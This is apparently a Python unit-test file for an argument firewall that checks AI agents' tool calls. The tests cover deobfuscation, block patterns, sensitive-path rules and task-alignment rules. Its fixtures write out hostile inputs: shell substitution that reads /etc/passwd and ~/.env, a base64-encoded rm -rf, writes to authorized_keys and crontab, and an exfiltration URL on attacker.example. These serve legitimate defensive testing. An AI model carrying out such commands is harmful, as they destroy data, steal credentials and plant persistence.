"""
Tests for patterns/tool_fence.py (RP-4: tool-call argument firewall).

Run from repo root:
    python -m unittest discover tests -v
"""
import base64
import unittest

from patterns.tool_fence import (
    Action,
    ToolFence,
    Verdict,
    block_pattern_rule,
    deobfuscate,
    sensitive_path_rule,
    task_alignment_rule,
    warn_pattern_rule,
)


# ---------------------------------------------------------------------------
# deobfuscate unit tests
# ---------------------------------------------------------------------------

class TestDeobfuscate(unittest.TestCase):
    def test_passthrough_plain_text(self):
        self.assertEqual(deobfuscate("hello world"), "hello world")

    def test_strips_url_percent_encoding(self):
        self.assertEqual(deobfuscate("rm%20-rf%20/tmp"), "rm -rf /tmp")

    def test_strips_zero_width_space(self):
        result = deobfuscate("hello​world")
        self.assertNotIn("​", result)
        self.assertIn("hello", result)

    def test_strips_rtl_override(self):
        result = deobfuscate("hello‮world")
        self.assertNotIn("‮", result)

    def test_decodes_base64_shell_command(self):
        payload = base64.b64encode(b"rm -rf /home/user").decode()
        result = deobfuscate(payload)
        self.assertIn("rm -rf", result)

    def test_leaves_short_b64_like_strings_alone(self):
        # Short alphanumeric strings that happen to be valid b64 should not be decoded
        # (threshold is 20 chars before padding)
        short = base64.b64encode(b"hi").decode()  # 4 chars — well below threshold
        result = deobfuscate(short)
        self.assertEqual(result, short)

    def test_idempotent_on_clean_input(self):
        text = "fetch all issues from the project repo"
        self.assertEqual(deobfuscate(deobfuscate(text)), deobfuscate(text))


# ---------------------------------------------------------------------------
# block_pattern_rule
# ---------------------------------------------------------------------------

class TestBlockPatternRule(unittest.TestCase):
    def setUp(self):
        self.rule = block_pattern_rule(
            [r"\$\(.*\)", r"`[^`]+`"],
            suggestion="Remove shell substitution.",
        )

    def test_blocks_shell_substitution(self):
        v = self.rule("run_cmd", {"cmd": "echo $(cat /etc/passwd)"})
        self.assertIsNotNone(v)
        self.assertEqual(v.action, Action.BLOCK)
        self.assertTrue(len(v.suggestion) > 0)

    def test_blocks_backtick_exec(self):
        v = self.rule("run_cmd", {"cmd": "echo `id`"})
        self.assertIsNotNone(v)
        self.assertEqual(v.action, Action.BLOCK)

    def test_allows_clean_args(self):
        v = self.rule("summarise", {"text": "open issues in my repo"})
        self.assertIsNone(v)

    def test_ignores_non_string_args(self):
        v = self.rule("compute", {"count": 42, "flag": True})
        self.assertIsNone(v)


# ---------------------------------------------------------------------------
# warn_pattern_rule
# ---------------------------------------------------------------------------

class TestWarnPatternRule(unittest.TestCase):
    def setUp(self):
        self.rule = warn_pattern_rule([r"http://"])

    def test_warns_on_http(self):
        v = self.rule("fetch", {"url": "http://insecure.example"})
        self.assertIsNotNone(v)
        self.assertEqual(v.action, Action.WARN)

    def test_allows_https(self):
        v = self.rule("fetch", {"url": "https://secure.example"})
        self.assertIsNone(v)


# ---------------------------------------------------------------------------
# sensitive_path_rule
# ---------------------------------------------------------------------------

class TestSensitivePathRule(unittest.TestCase):
    def setUp(self):
        self.rule = sensitive_path_rule()

    def test_blocks_ssh_key_path(self):
        v = self.rule("write_file", {"path": "~/.ssh/authorized_keys"})
        self.assertIsNotNone(v)
        self.assertEqual(v.action, Action.BLOCK)

    def test_blocks_etc_path(self):
        v = self.rule("read_file", {"path": "/etc/passwd"})
        self.assertIsNotNone(v)
        self.assertEqual(v.action, Action.BLOCK)

    def test_allows_project_relative_path(self):
        v = self.rule("write_file", {"path": "src/main.py"})
        self.assertIsNone(v)

    def test_allows_tmp_path(self):
        v = self.rule("write_file", {"path": "/tmp/output.txt"})
        self.assertIsNone(v)

    def test_custom_prefixes(self):
        rule = sensitive_path_rule(prefixes=["/secret/"])
        v = rule("read", {"path": "/secret/vault"})
        self.assertIsNotNone(v)
        self.assertEqual(v.action, Action.BLOCK)

    def test_custom_action_warn(self):
        rule = sensitive_path_rule(action=Action.WARN)
        v = rule("read", {"path": "/etc/hosts"})
        self.assertIsNotNone(v)
        self.assertEqual(v.action, Action.WARN)


# ---------------------------------------------------------------------------
# task_alignment_rule
# ---------------------------------------------------------------------------

class TestTaskAlignmentRule(unittest.TestCase):
    def setUp(self):
        self.task = "Summarise open GitHub issues in my project repository."
        self.rule = task_alignment_rule(self.task, threshold=0.20)

    def test_blocks_unrelated_url(self):
        v = self.rule("fetch_url", {"url": "https://attacker.example/steal?data=creds"})
        self.assertIsNotNone(v)
        self.assertEqual(v.action, Action.BLOCK)

    def test_allows_aligned_text(self):
        v = self.rule("summarise", {"text": "github issues summary from repository"})
        self.assertIsNone(v)

    def test_skips_short_args(self):
        # Args shorter than 10 chars are exempt (avoid flagging IDs / numbers)
        v = self.rule("get", {"id": "xyz"})
        self.assertIsNone(v)

    def test_ignores_non_string_args(self):
        v = self.rule("compute", {"limit": 10})
        self.assertIsNone(v)


# ---------------------------------------------------------------------------
# ToolFence integration tests
# ---------------------------------------------------------------------------

class TestToolFence(unittest.TestCase):
    def _fence(self, task: str = "Summarise GitHub issues.") -> ToolFence:
        return ToolFence(
            rules=[
                sensitive_path_rule(),
                block_pattern_rule([r"\$\(.*\)", r"`[^`]+`"]),
                task_alignment_rule(task),
            ]
        )

    # --- basic allow/block ---

    def test_allows_clean_call(self):
        v = self._fence().evaluate("summarise", {"text": "github issues summary"})
        self.assertTrue(v.allowed())
        self.assertEqual(v.action, Action.ALLOW)

    def test_blocks_sensitive_path(self):
        v = self._fence().evaluate("write_file", {"path": "/etc/crontab"})
        self.assertFalse(v.allowed())
        self.assertEqual(v.action, Action.BLOCK)

    def test_blocks_shell_substitution(self):
        v = self._fence().evaluate("run_cmd", {"cmd": "cat $(cat ~/.env)"})
        self.assertFalse(v.allowed())
        self.assertEqual(v.action, Action.BLOCK)

    def test_blocks_low_alignment_url(self):
        v = self._fence().evaluate(
            "fetch_url", {"url": "https://attacker.example/steal?data=creds"}
        )
        self.assertFalse(v.allowed())

    def test_verdict_carries_tool_name(self):
        v = self._fence().evaluate("write_file", {"path": "/etc/passwd"})
        self.assertEqual(v.tool_name, "write_file")

    # --- deobfuscation ---

    def test_blocks_base64_shell_command(self):
        payload = base64.b64encode(b"rm -rf /home/user").decode()
        # The base64 blob decodes to something containing "rm -rf" which itself
        # doesn't match the shell-substitution patterns — but deobfuscation
        # happens, and the decoded value is then evaluated by task_alignment
        # (very low overlap with GitHub-issues task).
        v = self._fence().evaluate("run_cmd", {"cmd": payload})
        self.assertFalse(v.allowed())

    def test_blocks_url_encoded_path(self):
        # /etc/passwd URL-encoded
        v = self._fence().evaluate("read_file", {"path": "%2Fetc%2Fpasswd"})
        self.assertFalse(v.allowed())

    def test_deobfuscate_false_skips_decoding(self):
        fence = ToolFence(
            rules=[sensitive_path_rule()],
            deobfuscate=False,
        )
        # URL-encoded /etc/passwd — without deobfuscation this won't match the
        # sensitive_path_rule prefix check and should be allowed.
        v = fence.evaluate("read_file", {"path": "%2Fetc%2Fpasswd"})
        self.assertTrue(v.allowed())

    # --- verdict fields ---

    def test_block_verdict_has_reason(self):
        v = self._fence().evaluate("write_file", {"path": "/etc/crontab"})
        self.assertTrue(len(v.reason) > 0)

    def test_allow_verdict_has_empty_reason(self):
        v = self._fence().evaluate("summarise", {"text": "github issues"})
        self.assertEqual(v.reason, "")

    # --- fail_closed ---

    def test_fail_closed_treats_human_review_as_block(self):
        def _always_human_review(tool_name, args):
            return Verdict(
                action=Action.HUMAN_REVIEW,
                tool_name=tool_name,
                args=args,
                reason="needs human sign-off",
            )

        fence = ToolFence(rules=[_always_human_review], fail_closed=True)
        v = fence.evaluate("dangerous_op", {})
        self.assertEqual(v.action, Action.BLOCK)
        self.assertIn("fail-closed", v.reason)

    def test_fail_open_passes_human_review_through(self):
        def _always_human_review(tool_name, args):
            return Verdict(
                action=Action.HUMAN_REVIEW,
                tool_name=tool_name,
                args=args,
                reason="needs human sign-off",
            )

        fence = ToolFence(rules=[_always_human_review], fail_closed=False)
        v = fence.evaluate("dangerous_op", {})
        self.assertEqual(v.action, Action.HUMAN_REVIEW)

    # --- rule ordering ---

    def test_first_matching_rule_wins(self):
        calls: list[str] = []

        def _rule_a(tool_name, args):
            calls.append("a")
            return Verdict(Action.BLOCK, tool_name, args, reason="rule-a fired")

        def _rule_b(tool_name, args):
            calls.append("b")
            return None

        fence = ToolFence(rules=[_rule_a, _rule_b])
        fence.evaluate("x", {})
        self.assertEqual(calls, ["a"])  # rule_b never reached

    def test_empty_rules_always_allows(self):
        fence = ToolFence(rules=[])
        v = fence.evaluate("anything", {"arg": "value"})
        self.assertTrue(v.allowed())

    # --- add_rule fluent API ---

    def test_add_rule_returns_self(self):
        fence = ToolFence()
        result = fence.add_rule(block_pattern_rule([r"bad"]))
        self.assertIs(result, fence)
        self.assertEqual(len(fence.rules), 1)


# ---------------------------------------------------------------------------
# Module-level demo runs without error
# ---------------------------------------------------------------------------

class TestDemoRuns(unittest.TestCase):
    def test_demo_executes(self):
        from patterns.tool_fence import _demo
        _demo()  # should not raise


if __name__ == "__main__":
    unittest.main()
